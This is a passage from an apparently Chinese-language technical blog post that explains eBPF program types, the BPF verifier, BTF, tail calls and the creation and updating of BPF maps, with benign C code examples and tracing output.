class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos bpf]# ./monitor-exec </span><br><span class="line">     barad_agent-20064   [000] d..31  7270.907178: bpf_trace_printk: Hello, BPF World!</span><br><span class="line"></span><br><span class="line">              sh-20067   [000] d..31  7270.909399: bpf_trace_printk: Hello, BPF World!</span><br><span class="line"></span><br><span class="line">              sh-20066   [000] d..31  7270.910152: bpf_trace_printk: Hello, BPF World!</span><br><span class="line"></span><br><span class="line">              sh-20065   [000] d..31  7270.912163: bpf_trace_printk: Hello, BPF World!</span><br><span class="line"></span><br><span class="line">     barad_agent-20069   [000] d..31  7273.905863: bpf_trace_printk: Hello, BPF World!</span><br><span class="line"></span><br><span class="line">              sh-20069   [000] d..31  7273.907699: bpf_trace_printk: Hello, BPF World!</span><br><span class="line"></span><br><span class="line">     barad_agent-20070   [000] d..31  7273.909361: bpf_trace_printk: Hello, BPF World!</span><br><span class="line"></span><br><span class="line">              sh-20072   [000] d..31  7273.911010: bpf_trace_printk: Hello, BPF World!</span><br><span class="line"></span><br><span class="line">              sh-20071   [000] d..31  7273.912147: bpf_trace_printk: Hello, BPF World!</span><br></pre></td></tr></table></figure><p>当您停止此程序时，该消息将停止显示在您的终端中。 一旦加载 BPF 程序的程序终止，BPF 程序就会从虚拟机中卸载。在接下来的章节中，我们将探讨如何使BPF程序持久化，即使它们的加载器终止之后，因为在许多情况下，我们会希望BPF程序在后台运行，从系统中收集数据，而不管其他进程是否正在运行。现在我们已经了解了BPF程序的基本结构，接下来可以深入了解我们能够编写哪些类型的程序，从而使得我们能够访问Linux内核中的不同子系统。</p><h3 id="BPF程序类型"><a href="#BPF程序类型" class="headerlink" title="BPF程序类型"></a>BPF程序类型</h3><p>尽管程序中没有明确的分类，但我们可以将所有类型分为两类，具体取决于它们的主要用途。</p><p>第一类是追踪(tracing)。 编写的程序会帮助你更好地了解系统中正在发生的事情。它们为你提供有关系统行为及其运行的硬件的直接信息。 它们可以访问与特定程序相关的内存区域，并从正在运行的进程中提取执行跟踪信息。 它们还使你可以直接访问为每个特定进程分配的资源，从文件描述符到CPU和内存的使用情况。</p><p>第二类是网络(networking)。 这些类型的程序允许你检查和操作系统中的网络流量。它们让你过滤来自网络接口的数据包，甚至完全拒绝这些数据包。不同类型的程序可以附着(attach)到内核内网络处理的不同阶段。 这有优点也有缺点。例如，你可以在网络驱动程序接收到数据包后立即将BPF程序附着到网络事件，但是该程序将访问的有关数据包的信息较少，因为内核还没有足够的信息来提供给你。另一方面，您可以在 BPF 程序被传递到用户空间之前立即将它们附加到网络事件。 在这种情况下，你可以获得有关数据包的更多信息，这会帮助你做出更好的决策，但是这样处理成本较高。</p><p>我们接下来展示的程序类型没有分类。我们按照它们被添加到内核的时间顺序来介绍这些类型。 </p><h4 id="Socket-Filter程序"><a href="#Socket-Filter程序" class="headerlink" title="Socket Filter程序"></a>Socket Filter程序</h4><p><code>BPF_PROG_TYPE_SOCKET_FILTER</code>是第一个添加到Linux内核的程序类型。当BPF程序附着到原始套接字时，你可以访问该套接字处理的所有数据包。套接字过滤程序不允许修改这些数据包的内容或更改这些数据包的目的地，它们仅允许你出于可观察性目的访问它们。你的程序接收的元数据包含与网络堆栈相关的信息，例如用于传递数据包的协议类型等。</p><h4 id="Kprobe程序"><a href="#Kprobe程序" class="headerlink" title="Kprobe程序"></a>Kprobe程序</h4><p><code>kprobes</code>是可以动态附加到内核中某些调用点的函数。<code>BPF kprobe</code>程序类型允许你将BPF程序用作<code>kprobe</code>处理程序。 它们使用<code>BPF_PROG_TYPE_KPROBE</code>类型定义。BPF虚拟机确保<code>kprobe</code>程序始终可以安全运行，这是传统<code>kprobe</code>模块的优势。 这里需要强调的是，<code>kprobe</code>不是内核中的稳定入口点，所以你需要确保<code>kprobe BPF</code>程序与你正在使用的特定内核版本兼容。</p><p>当你编写一个附着到<code>kprobe</code>的BPF程序时，你需要决定它是作为函数调用中的第一条指令执行还是在调用完成时执行。你需要在BPF程序的节头中声明此行为。例如，如果你想在内核调用<code>exec</code>系统调用时检查参数，你将在调用开始时附加程序，这个时候需要在头部添加<code>SEC(&quot;kprobe/sys_exec&quot;)</code>。如果要检查调用<code>exec</code>系统调用的返回值，则需要在头部添加<code>SEC(&quot;kretprobe/sys_exec&quot;)</code>。</p><h4 id="Tracepoint程序"><a href="#Tracepoint程序" class="headerlink" title="Tracepoint程序"></a>Tracepoint程序</h4><p>这种类型的程序允许将BPF程序附着到内核提供的跟踪点处理程序。跟踪点程序使用<code>BPF_PROG_TYPE_TRACEPOINT</code>类型定义。跟踪点是内核代码库中的静态标记，允许注入任意代码进行跟踪和调试。它们不如<code>kprobes</code>灵活，因为它们需要事先由内核定义，但在引入内核后就是稳定的。 当你想要调试系统时，这种方法提供了更高级别的可预测性。</p><p>系统中的所有跟踪点都定义在目录<code>/sys/kernel/debug/tracing/events</code>中。在该目录下，每个子系统都包含任何跟踪点，并且可以将BPF程序附着到这些子系统。BPF跟踪点在<code>/sys/kernel/debug/tracing/events/bpf</code>中定义。 例如，可以在此处找到<code>bpf_prog_load</code>的跟踪点定义。 这意味着你可以编写一个BPF程序来检查其他BPF程序何时加载。</p><h4 id="XDP程序"><a href="#XDP程序" class="headerlink" title="XDP程序"></a>XDP程序</h4><p>XDP程序允许你编写在网络数据包到达内核时就执行的代码。 它们使用<code>BPF_PROG_TYPE_XDP</code>类型定义。 鉴于内核没有太多时间来处理信息本身，它只从数据包中公开一组有限的信息。 因为数据包是在早期执行的，所以你对如何处理该数据包有更高级别的控制。</p><p>XDP程序定义了几个可以控制的操作，并允许你决定如何处理该数据包。你可以从你的XDP程序中返回<code>XDP_PASS</code>，这意味着数据包应该被传递到内核中的下一个子系统。你还可以返回<code>XDP_DROP</code>，这意味着内核应该完全忽略此数据包，并且不对其进行任何其他操作。你还可以返回<code>XDP_TX</code>，这意味着数据包应该被转发回最初接收数据包的网卡接口(NIC)。</p><p>这种级别的控制使得网络层的处理更加灵活，XDP也已经成为BPF中的主要组件之一。在后续章节中，我们还会讨论XDP许多强大之处，例如保护你的网络免受分布式拒绝服务(DDoS)攻击。</p><h4 id="Perf-Event程序"><a href="#Perf-Event程序" class="headerlink" title="Perf Event程序"></a>Perf Event程序</h4><p>这些类型的BPF程序允许你将BPF代码附着到<code>Perf events</code>。它们使用<code>BPF_PROG_TYPE_PERF_EVENT</code>类型定义。<code>Perf</code>是内核中的一个内部分析器，它为硬件和软件发出性能数据事件。你可以使用它来监控许多事物，从计算机的CPU到系统上运行的任何软件。当你将BPF程序附着到<code>Perf events</code>时，你的代码将在每次<code>Perf</code>生成数据时执行。</p><h4 id="Cgroup-Socket程序"><a href="#Cgroup-Socket程序" class="headerlink" title="Cgroup Socket程序"></a>Cgroup Socket程序</h4><p>这些类型的程序允许你将BPF处理逻辑附着到控制组(cgroups)。它们使用<code>BPF_PROG_TYPE_CGROUP_SKB</code>类型定义。它们允许<code>cgroup</code>控制它们包含的进程内的网络流量。使用这些程序可以在将网络数据包交付<code>cgroup</code>中的进程之前决定如何处理它。内核尝试传递给同一<code>cgroup</code>中的任何进程的任何数据包都将通过这些过滤器之一。 同时，你可以决定当<code>cgroup</code>中的进程通过该接口发送网络数据包时要做什么。</p><p>你会发现，这些行为类似于<code>BPF_PROG_TYPE_SOCKET_FILTER</code>程序。 主要区别在于<code>BPF_PROG_TYPE_CGROUP_SKB</code>程序附着到一个<code>cgroup</code>内的所有进程，而不是特定进程；这种行为适用于在给定<code>cgroup</code>中创建的当前和以后的套接字。附着到<code>cgroup</code>的BPF程序在容器环境中非常有用，在这些环境下，进程组受<code>cgroup</code>约束，因此你可以将相同的策略应用于所有进程，而无需单独识别每个进程。<code>Cilium</code>是一个流行的开源项目，它为<code>Kubernetes</code>提供负载均衡和安全功能，在<code>cilium</code>中，广泛使用<code>cgroup</code>套接字程序将其策略应用于组而不是孤立的容器中。</p><h4 id="Cgroup-Open-Socket程序"><a href="#Cgroup-Open-Socket程序" class="headerlink" title="Cgroup Open Socket程序"></a>Cgroup Open Socket程序</h4><p>这些类型的程序允许你在<code>cgroup</code>中的任何进程打开网络套接字时执行代码。这种行为类似于附着到<code>cgroup</code>套接字缓冲区的程序，但不是让你在数据包通过网络时访问它们，而是允许你控制进程打开新套接字时发生的情况。它们使用<code>BPF_PROG_TYPE_CGROUP_SOCK</code>类型定义。 这对于可以打开套接字的程序组提供安全性和访问控制很有用，因为这样不必单独限制每个进程的功能。</p><h4 id="Socket-Option程序"><a href="#Socket-Option程序" class="headerlink" title="Socket Option程序"></a>Socket Option程序</h4><p>这些类型的程序允许你在运行时修改套接字连接选项，当数据包通过内核网络堆栈中的多个阶段时。它们附着到<code>cgroup</code>上，很像<code>BPF_PROG_TYPE_CGROUP_SOCK</code>和<code>BPF_PROG_TYPE_CGROUP_SKB</code>，但与那些程序类型不同的是，它们可以在连接的生命周期内多次调用。 该程序使用<code>BPF_PROG_TYPE_SOCK_OPS</code>类型定义。</p><p>当你创建一个这种类型的BPF程序时，你的函数调用会收到一个名为<code>op</code>的参数，它表示内核将要通过套接字连接执行的操作，因此，你就会知道程序在连接生命周期中的哪个时间点被调用。有了这些信息，你就可以访问网络IP地址和连接端口等数据，还可以修改连接选项以设置超时并更改给定数据包的往返延迟时间。</p><p>举个例子，<code>Facebook</code>使用它来为同一数据中心内的连接设置较短的设置重传超时(RTO)。RTO是系统在网络连接预计发生故障后恢复的时间。这个目标也代表了系统在遭受不可连接的情况下无法使用的时间。 在<code>Facebook</code>的案例中，它假设同一数据中心中的机器应该具有较短的RTO，并且使用 BPF 程序修改了这个阈值。</p><h4 id="Socket-Map程序"><a href="#Socket-Map程序" class="headerlink" title="Socket Map程序"></a>Socket Map程序</h4><p><code>BPF_PROG_TYPE_SK_SKB</code>程序让你可以访问套接字映射和套接字重定向。 套接字映射允许你保留对多个套接字的引用。当你有这些引用时，你可以使用特殊的帮助器将传入的数据包从一个套接字重定向到另一个套接字。当你想使用BPF实现负载均衡功能时，可以通过跟踪多个套接字在它们之间转发网络数据包，而无需离开内核空间。<code>Cillium</code>和<code>Facebook</code>的<code>Katran</code>等项目广泛使用这些类型的程序来控制网络流量。</p><h4 id="Cgroup-Device程序"><a href="#Cgroup-Device程序" class="headerlink" title="Cgroup Device程序"></a>Cgroup Device程序</h4><p>这种类型的程序允许你决定是否可以为给定设备执行<code>cgroup</code>中的操作。这些程序使用<code>BPF_PROG_TYPE_CGROUP_DEVICE</code>类型定义。 <code>cgroups (v1)</code>的第一个实现允许你为特定设备设置权限，然而，<code>cgroups（v2）</code> 缺少这个特性。引入这种类型的程序是为了提供该功能。同时，能够编写BPF程序可以让你在需要时更灵活地设置这些权限。</p><h4 id="Socket-Message-Delivery程序"><a href="#Socket-Message-Delivery程序" class="headerlink" title="Socket Message Delivery程序"></a>Socket Message Delivery程序</h4><p>这些类型的程序可以控制是否应该传递发送到套接字的消息。它们使用<code>BPF_PROG_TYPE_SK_MSG</code>类型定义。当内核创建<code>socket</code>时，它会将<code>socket</code>存储在<code>socket map</code>中。该<code>map</code>使内核可以快速访问特定的<code>socket</code>组。当你将套接字消息的BPF程序附着到<code>socket map</code>时，发送到这些<code>socket</code>的所有消息都将在传递它们之前被程序过滤。在过滤消息之前，内核会复制消息中的数据，以便可以处理它。这些程序有两个返回值：<code>SK_PASS</code>和<code>SK_DROP</code>。 如果你希望内核将消息发送到<code>socket</code>，则使用第一个，如果你希望内核忽略该消息，则使用后一个。</p><h4 id="RAW-Tracepoint程序"><a href="#RAW-Tracepoint程序" class="headerlink" title="RAW Tracepoint程序"></a>RAW Tracepoint程序</h4><p>我们之前谈到了一种访问内核中跟踪点的程序。内核开发人员添加了一个新的跟踪点程序来解决访问内核保存的原始格式的跟踪点参数。这种格式让你可以访问有关内核正在执行的任务的更详细信息，但是，它的性能开销很小。 大多数情况下你会希望在程序中使用常规跟踪点来避免这种性能开销，你也可以在需要时使用原始跟踪点访问原始参数。这些类型的程序被定义为<code>BPF_PROG_TYPE_RAW_TRACE POINT</code></p><h4 id="Cgroup-Socket-Address程序"><a href="#Cgroup-Socket-Address程序" class="headerlink" title="Cgroup Socket Address程序"></a>Cgroup Socket Address程序</h4><p>当用户空间程序由特定的<code>cgroup</code>控制时，这种类型的程序允许你操作用户空间程序所附加的IP地址和端口号。 当你希望确保一组特定的用户空间程序使用相同的IP地址和端口时，你的系统会使用多个IP地址。当你将这些用户空间程序放在同一个<code>cgroup</code>中时，这些BPF程序使你可以灵活地操作这些绑定。这确保了来自这些应用程序的所有传入和传出连接都使用BPF程序提供的IP和端口。这些程序类型定义为<code>BPF_PROG_TYPE_CGROUP_SOCK_ADDR</code></p><h4 id="Socket-Reuseport程序"><a href="#Socket-Reuseport程序" class="headerlink" title="Socket Reuseport程序"></a>Socket Reuseport程序</h4><p><code>SO_REUSEPORT</code>是内核中的一个选项，它允许同一主机中的多个进程绑定到同一端口。 当你想要跨多个线程分配负载时，此选项允许在接受的网络连接中获得更高的性能。<code>BPF_PROG_TYPE_SK_REUSEPORT</code>程序类型允许你编写<code>BPF</code>程序<code>hook</code>到内核来决定是否重用端口。如果你的BPF程序返回<code>SK_DROP</code>，你可以阻止程序重用同一个端口。当BPF程序返回<code>SK_PASS</code>时，你可以通知内核使用它自己的重用例程。</p><h4 id="Flow-Dissection程序"><a href="#Flow-Dissection程序" class="headerlink" title="Flow Dissection程序"></a>Flow Dissection程序</h4><p>流解析器是内核的一个组件，它跟踪网络数据包需要通过的不同层，从到达系统到交付到用户空间程序。 它允许你使用不同的分类方法来控制数据包的流动。内核中内置的解析器称为<code>Flower</code>分类器，防火墙和其他过滤设备使用它来决定如何处理特定的数据包。</p><p><code>BPF_PROG_TYPE_FLOW_DISSECTOR</code>程序旨在<code>hook</code>流解析器路径中的逻辑。 它们提供了内置解析器无法提供的安全保证，例如确保程序始终终止，这在内置解析器中可能无法保证。 这些BPF程序可以修改网络数据包在内核中所遵循的流。</p><h4 id="Other-BPF程序"><a href="#Other-BPF程序" class="headerlink" title="Other BPF程序"></a>Other BPF程序</h4><p>我们已经讨论了在不同环境中使用的程序类型，但还有一些其他的BPF程序类型我们还没有涉及。 在这里仅简要提及</p><ul><li><p>Traffic classifier程序</p><p><code>BPF_PROG_TYPE_SCHED_CLS</code>和<code>BPF_PROG_TYPE_SCHED_ACT</code>是两种类型的BPF程序，它们允许对网络流量进行分类并修改套接字缓冲区中数据包的某些属性。</p></li><li><p>Lightweight tunnel程序</p><p><code>BPF_PROG_TYPE_LWT_IN、BPF_PROG_TYPE_LWT_OUT、BPF_PROG_TYPE_LWT_XMIT 和 BPF_PROG_TYPE_LWT_SEG6LOCAL</code>是允许将代码附着到内核的轻量级隧道基础设施的BPF程序类型。</p></li><li><p>Infrared device程序</p><p><code>BPF_PROG_TYPE_LIRC_MODE2</code>程序允许通过连接到红外设备（例如遥控器）来附着BPF程序。</p></li></ul><p>以上这些程序是专门的，它们的使用尚未被社区广泛采用。</p><p>接下来，我们将讨论BPF如何确保你的程序在内核加载它们后不会导致系统发生灾难性故障。</p><h3 id="BPF校验器"><a href="#BPF校验器" class="headerlink" title="BPF校验器"></a>BPF校验器</h3><p>允许任何人在Linux内核中执行任何代码乍一听是一件很疯狂的事情。如果没有BPF验证器，在生产系统中运行BPF程序的风险会太高。用内核网络维护者之一<code>Dave S. Miller</code>的话来说，“唯一介于eBPF程序和一个黑暗破坏鸿沟之间的是eBPF验证器。”</p><p>显然，BPF验证器也是一个运行在系统上的程序，它能够仔细审查以确保正确完成它的工作。在过去几年中，安全研究人员在验证程序中发现了一些漏洞，这些漏洞允许攻击者访问内核中的随机内存，即使是非特权用户。你可以在CVE目录中阅读有关此类漏洞的更多信息。 例如，<code>CVE-2017-16995</code>描述了任何用户如何读写内核内存并绕过BPF验证程序。</p><p>验证程序执行的第一个检查是对虚拟机将要加载的代码的静态分析。 第一次检查的目的是确保程序有预期的结束。为此，验证器使用代码创建有向无环图 (DAG)。验证器分析的每条指令都成为图中的一个节点，每个节点都链接到下一条指令。验证器生成此图后，会执行深度优先搜索(DFS)，以确保程序完成并且代码不包含危险路径。 这意味着它将遍历图的每个分支，一直到分支的底部，以保证没有递归循环。</p><p>以下是验证器在第一次检查期间的一些条件：</p><ul><li>程序不包括控制循环。为了确保程序不会陷入无限循环，验证器拒绝任何类型的控制循环。已经有人提议在 BPF 程序中允许循环，但在撰写本文时，还没有一个被采用。</li><li>程序不会尝试执行超过内核允许的最大值的指令。此时，要执行的最大指令数为4096。这个限制是为了防止BPF永远运行。</li><li>程序不包含任何无法访问的指令，例如从未执行的条件或函数。这可以防止在虚拟机中加载死代码，这也会延迟BPF程序的终止。</li><li>程序不会试图跳出它的界限。</li></ul><p>验证器执行的第二项检查是BPF程序的试运行。 这意味着验证器将尝试分析程序将要执行的每条指令，以确保它不会执行任何无效指令。此次执行还检查所有内存指针是否被正确访问和取消引用。最后，试运行会通知验证器程序中的控制流，以确保无论程序采用哪条控制路径，它都到达<code>BPF_EXIT</code>指令。为此，验证器会跟踪堆栈中所有访问过的分支路径，并在采用新路径之前对其进行评估，以确保它不会多次访问特定路径。在这两项检查通过后，验证器认为程序是可以安全执行的。</p><p>如果你对如何分析程序感兴趣，bpf系统调用允许你进行调试验证程序的检查。 当你使用此系统调用加载程序时，可以设置几个属性，使验证程序打印其操作日志：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> bpf_attr attr = &#123; </span><br><span class="line">  .prog_type = type,</span><br><span class="line">.insns = ptr_to_u64(insns), </span><br><span class="line">  .insn_cnt = insn_cnt,</span><br><span class="line">.license =ptr_to_u64(license), </span><br><span class="line">  .log_buf =ptr_to_u64(bpf_log_buf), </span><br><span class="line">  .log_size = LOG_BUF_SIZE, </span><br><span class="line">  .log_level = <span class="number">1</span>,</span><br><span class="line">&#125;;</span><br><span class="line">bpf(BPF_PROG_LOAD, &amp;attr, <span class="keyword">sizeof</span>(attr));</span><br></pre></td></tr></table></figure><p><code>log_level</code>字段告诉验证器是否打印任何日志。设置为1时会打印其日志，设置为0时不会打印任何内容。如果要打印验证器日志，还需要提供日志缓冲区及其大小。这个缓冲区是一个多行字符串，你可以打印它来检查验证器所做出的决定。</p><p>下一节将介绍BPF如何在内存中构造程序信息。程序的结构方式将有助于弄清楚如何访问BPF内部，帮助你更好的调试和理解程序的行为方式。</p><h3 id="BPF类型格式"><a href="#BPF类型格式" class="headerlink" title="BPF类型格式"></a>BPF类型格式</h3><p>BPF类型格式(BTF)是元数据结构的集合，可增强BPF 程序、映射和函数的调试信息。BTF包含源信息，因此我们在后续所讨论的<code>BPFTool</code>等工具可以向你展示对BPF数据的更丰富的解释。这些元数据存储在二进制程序中一个特殊的“.BFT”元数据部分下。BTF信息有助于使你的程序更易于调试，但它会显著增加二进制文件的大小，因为它需要跟踪程序中声明的所有内容的类型信息。BPF验证器也使用此信息来确保你的程序定义的结构类型是正确的。</p><p>BTF专门用于注释C语言类型。 像<code>LLVM</code>这样的BPF编译器知道如何为你包含这些信息，因此你无需完成将这些信息添加到每个结构的繁琐任务。然而，在某些情况下，工具链仍然需要一些注释来增强程序。在后续章节，我们将描述这些注释是如何发挥作用的，以及像<code>BPFTool</code>这样的工具是如何显示这些信息的。</p><h3 id="BPF尾调用"><a href="#BPF尾调用" class="headerlink" title="BPF尾调用"></a>BPF尾调用</h3><p>BPF程序可以通过尾调用调用其他BPF程序。 这是一个强大的功能，因为它允许你通过组合更小的BPF函数来组装更复杂的程序。<code>5.2</code>之前的内核版本对BPF程序可以生成的机器指令的数量有硬性限制。此限制设置为4096，以确保程序可以在合理的时间内终止。然而，随着人们构建更复杂的BPF程序，他们需要一种方法来扩展内核强加的指令限制，这就是尾调用发挥作用的地方。从内核版本<code>5.2</code>开始，指令限制增加到一百万条指令。尾调用嵌套也受到限制，在本例中为32个调用，这意味着你可以在一个链中组合多达32个程序来为遇到的问题提供解决方案。</p><p>当你从另一个BPF程序调用一个BPF程序时，内核会完全重置程序上下文。记住这一点很重要，因为你可能需要一种在程序之间共享信息的方法。每个BPF程序作为其参数接收的上下文对象不会帮助我们解决这个数据共享问题。 在下一章中，我们将讨论<code>BPF map</code>作为在程序之间共享信息的一种方式。我们还会展示如何使用尾调用从一个BPF程序跳转到另一个的示例。</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="http://vinin.me/2022/04/10/Hello-eBPF/" target="_blank" rel="noopener">http://vinin.me/2022/04/10/Hello-eBPF/</a></li><li><a href="https://mirrors.edge.kernel.org/pub/linux/kernel/v5.x/" target="_blank" rel="noopener">https://mirrors.edge.kernel.org/pub/linux/kernel/v5.x/</a></li><li><p><a href="https://elixir.bootlin.com/linux/v5.5.19/source/samples/bpf" target="_blank" rel="noopener">https://elixir.bootlin.com/linux/v5.5.19/source/samples/bpf</a></p></li><li><p><a href="https://cloud.tencent.com/developer/article/1472857" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1472857</a></p></li><li><a href="https://blog.csdn.net/Xiongzhizhu/article/details/51816243" target="_blank" rel="noopener">https://blog.csdn.net/Xiongzhizhu/article/details/51816243</a></li><li><a href="https://blog.csdn.net/weixin_43847470/article/details/122145676" target="_blank" rel="noopener">https://blog.csdn.net/weixin_43847470/article/details/122145676</a></li></ul><h2 id="第三章节"><a href="#第三章节" class="headerlink" title="第三章节"></a>第三章节</h2><h3 id="BPF映射"><a href="#BPF映射" class="headerlink" title="BPF映射"></a>BPF映射</h3><p>在程序中调用行为的消息传递是软件工程中广泛使用的技术。 一个程序可以通过发送消息来修改另一个程序的行为，这也允许在这些程序之间交换信息。 BPF最令人痴迷的一方面是，内核代码和被加载的代码可以在运行时使用消息传递相互通信。</p><p>在本章中，我们将介绍BPF程序和用户空间程序如何相互通信。我们描述了内核和用户空间之间的不同通信管道，以及它们如何存储信息。 我们还向你展示了这些管道的用例，以及如何使这些管道中的数据在程序初始化之间进行持久化。</p><p>BPF映射是驻留在内核中的<code>key/value</code>存储。 任何知道它们的BPF程序都可以访问它们。在用户空间中运行的程序也可以通过使用文件描述符来访问这些映射。只要事先正确指定数据大小，就可以在<code>map</code>中存储任何类型的数据。 内核将键和值视为二进制类型的大对象(blob)，它不关心你在<code>map</code>中保留的内容。BPF 验证器包含多种保护措施，以确保你所创建和访问<code>map</code>的方式是安全的。 </p><h4 id="创建BPF映射"><a href="#创建BPF映射" class="headerlink" title="创建BPF映射"></a>创建BPF映射</h4><p>创建BPF映射最直接的方法是使用bpf系统调用。当调用的第一个参数是<code>BPF_MAP_CREATE</code>时，是在告诉内核你想要创建一个新的映射。此调用将返回与你刚创建的<code>BPF Maps</code>关联的文件描述符标识符。系统调用中的第二个参数是此映射的配置：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> bpf_attr &#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    __u32 map_type;<span class="comment">/* one of the values from bpf_map_type */</span></span><br><span class="line">    __u32 key_size;<span class="comment">/* size of the keys, in bytes */</span></span><br><span class="line">    __u32 value_size;<span class="comment">/* size of the values, in bytes */</span></span><br><span class="line">    __u32 max_entries;<span class="comment">/* maximum number of entries in the map */</span></span><br><span class="line">    __u32 map_flags;<span class="comment">/* flags to modify how we create the map */</span></span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>系统调用中的第三个参数是此配置属性的大小。例如，你可以创建一个<code>hash map</code>来存储无符号整数作为键和值，如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> bpf_attr my_map &#123; </span><br><span class="line">  .map_type = BPF_MAP_TYPE_HASH, </span><br><span class="line">  .key_size = <span class="keyword">sizeof</span>(<span class="keyword">int</span>), </span><br><span class="line">  .value_size = <span class="keyword">sizeof</span>(<span class="keyword">int</span>), </span><br><span class="line">  .max_entries = <span class="number">100</span>,</span><br><span class="line">.map_flags = BPF_F_NO_PREALLOC,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">int</span> fd = bpf(BPF_MAP_CREATE, &amp;my_map, <span class="keyword">sizeof</span>(my_map));</span><br></pre></td></tr></table></figure><p>如果调用失败，内核将返回值-1。 失败的原因可能有三个。如果其中一个属性无效，内核将<code>errno</code>变量设置为<code>EINVAL</code>。 如果执行操作的用户没有足够的权限，内核会将<code>errno</code>变量设置为<code>EPERM</code>。 最后，如果没有足够的内存来存储映射，内核将<code>errno</code>变量设置为<code>ENOMEM</code>。</p><h4 id="创建BPF映射的ELF约定"><a href="#创建BPF映射的ELF约定" class="headerlink" title="创建BPF映射的ELF约定"></a>创建BPF映射的ELF约定</h4><p>内核包含一些约定和助手来生成和使用<code>BPF maps</code>。 你可能会发现这些约定比直接执行系统调用更频繁地出现，因为它们更具可读性且更容易遵循。请记住，这些约定仍然使用bpf系统调用来创建<code>map</code>，即使直接在内核中运行也是如此，如果不知道事先需要哪种<code>map</code>，你会发现直接使用系统调用更有用。</p><p>helper函数<code>bpf_map_create</code>包装了刚才看到的代码，以便更容易根据需要初始化<code>map</code>。我们可以使用它创建先前定义的<code>map</code>，只需一行代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line">fd = bpf_create_map(BPF_MAP_TYPE_HASH, <span class="keyword">sizeof</span>(<span class="keyword">int</span>), <span class="keyword">sizeof</span>(<span class="keyword">int</span>), <span class="number">100</span>,</span><br><span class="line">        BPF_F_NO_PREALOC);</span><br></pre></td></tr></table></figure><p>如果你知道你的程序需要哪种<code>map</code>，你也可以预先定义它。这有助于在程序预先使用的<code>map</code>中获得更高的可见性：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct bpf_map_def <span class="title">SEC</span><span class="params">(<span class="string">"maps"</span>)</span> my_map </span>= &#123; </span><br><span class="line">  .type = BPF_MAP_TYPE_HASH, </span><br><span class="line">  .key_size = <span class="keyword">sizeof</span>(<span class="keyword">int</span>), </span><br><span class="line">  .value_size = <span class="keyword">sizeof</span>(<span class="keyword">int</span>), </span><br><span class="line">  .max_entries = <span class="number">100</span>,</span><br><span class="line">.map_flags =BPF_F_NO_PREALLOC, </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>当您以这种方式定义<code>map</code>时，您使用的是所谓的<code>section</code>属性，在本例中为<code>SEC(&quot;maps&quot;)</code>。 这个宏告诉内核这个结构是一个BPF映射，它应该被相应地创建。你可能已经注意到，在这个新示例中，我们没有与<code>map</code>关联的文件描述符标识符。 在这种情况下，内核使用一个名为<code>map_data</code>的全局变量来存储有关程序中<code>map</code>的信息。 这个变量是一个结构数组，它按照你在代码中指定每个映射的方式排序。例如，如果前一个<code>map</code>是你的代码中指定的第一个<code>map</code>，你将从数组中的第一个元素获取文件描述符标识符：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fd = map_data[<span class="number">0</span>].fd;</span><br></pre></td></tr></table></figure><p>你还可以从此结构中访问<code>map</code>的名称及其定义， 此信息有时可用于调试和跟踪目的。初始化<code>map</code>后，你可以开始使用它们在内核和用户空间之间发送消息。 现在让我们看看如何使用这些<code>map</code>所存储的数据进行工作。</p><h3 id="与BPF映射工作"><a href="#与BPF映射工作" class="headerlink" title="与BPF映射工作"></a>与BPF映射工作</h3><p>内核和用户空间之间的通信将成为你编写的每个BPF程序的基础部分。 为内核编写代码时访问映射的<code>API</code>与为用户空间程序编写代码时不同。 本节介绍每个实现的语义和具体细节。</p><h4 id="更新BPF映射中的元素"><a href="#更新BPF映射中的元素" class="headerlink" title="更新BPF映射中的元素"></a>更新BPF映射中的元素</h4><p>创建任何<code>map</code>后，你可能希望用信息填充它。为此，内核助手提供了函数<code>bpf_map_update_elem</code>。 如果你在内核运行的程序中从<code>bpf/bpf_helpers.h</code>加载这个函数，与在用户空间运行的程序中从<code>tools/lib/bpf/bpf.h</code>加载它，这个函数的签名是不同的。这是因为在内核中工作时可以直接访问<code>map</code>，但在用户空间中工作时需要使用文件描述符引用它们。行为也略有不同，内核上运行的代码可以直接访问内存中的<code>map</code>，并且可以就地原子地更新元素。但是，在用户空间中运行的代码必须将消息发送到内核，内核会在更新<code>map</code>之前复制提供的值，这使得更新操作不是原子的。此函数在操作成功时返回0，在操作失败时返回负数。 在失败的情况下，全局变量<code>errno</code>将填充失败原因。 我们将在本章后面列出更多上下文的失败案例。</p><p>内核中的<code>bpf_map_update_elem</code>函数有四个参数。第一个是指向我们已经定义的<code>map</code>的指针。 